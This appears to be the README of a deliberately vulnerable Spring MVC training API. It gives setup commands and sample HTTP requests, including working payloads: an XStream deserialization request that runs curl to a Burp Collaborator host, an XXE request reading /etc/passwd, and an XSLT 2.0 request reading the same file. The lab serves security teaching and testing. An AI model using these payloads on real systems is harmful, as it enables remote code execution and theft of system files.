# Sample Spring MVC API vulnerable to deserialization attacks

1. `git clone https://github.com/eoftedal/deserialize.git`
2. `cd deserialize`
3. `mvn clean install jetty:run`

Accessible on port 8080

### Running in docker
1. `git clone https://github.com/eoftedal/deserialize.git`
2. `cd deserialize`
3. `docker run -v $(pwd):/data -p 8080:8080 -it maven /bin/bash`
4. `cd /data`
5. `mvn clean install jetty:run`

## Normal request

```
POST /api/contacts HTTP/1.1
Host: localhost
Content-Type: application/xml
Accept: application/xml

<contact>  
    <id>1</id>
    <firstName>yo</firstName>
    <lastName>lo</lastName>
    <email>yo@lo.no</email>
</contact>  
```

## Deserialization attack

```
POST /api/contacts HTTP/1.1
Host: localhost
Content-Type: application/xml
Accept: application/xml

<dynamic-proxy>  
  <interface>org.insecurelabs.api.contacts.Contact</interface>  
  <handler class="java.beans.EventHandler">  
    <target class="java.lang.ProcessBuilder">
      <command><string>/usr/bin/curl</string><string>http://[yourid].burpcollaborator.net</string></command>
    </target>
    <action>start</action>
  </handler>  
</dynamic-proxy> 
```

## XXE

```
POST /api/contacts HTTP/1.1
Host: localhost
Content-Type: application/xml
Accept: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ELEMENT string (#PCDATA)>
    <!ENTITY content SYSTEM "file:/etc/passwd">
]>
<contact>  
    <id>1</id>
    <firstName>&content;</firstName>
    <lastName>lo</lastName>
    <email>yo@lo.no</email>
</contact>
```

## XSLT 2.0

```
POST /api/contacts/1/html HTTP/1.1
Host: localhost
Content-Type: application/xslt
Accept: text/html
Content-Length: 241

<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:template match="/">
  <xsl:value-of select="unparsed-text('/etc/passwd')"/>
 </xsl:template>
</xsl:stylesheet>
```


# Resources
http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/
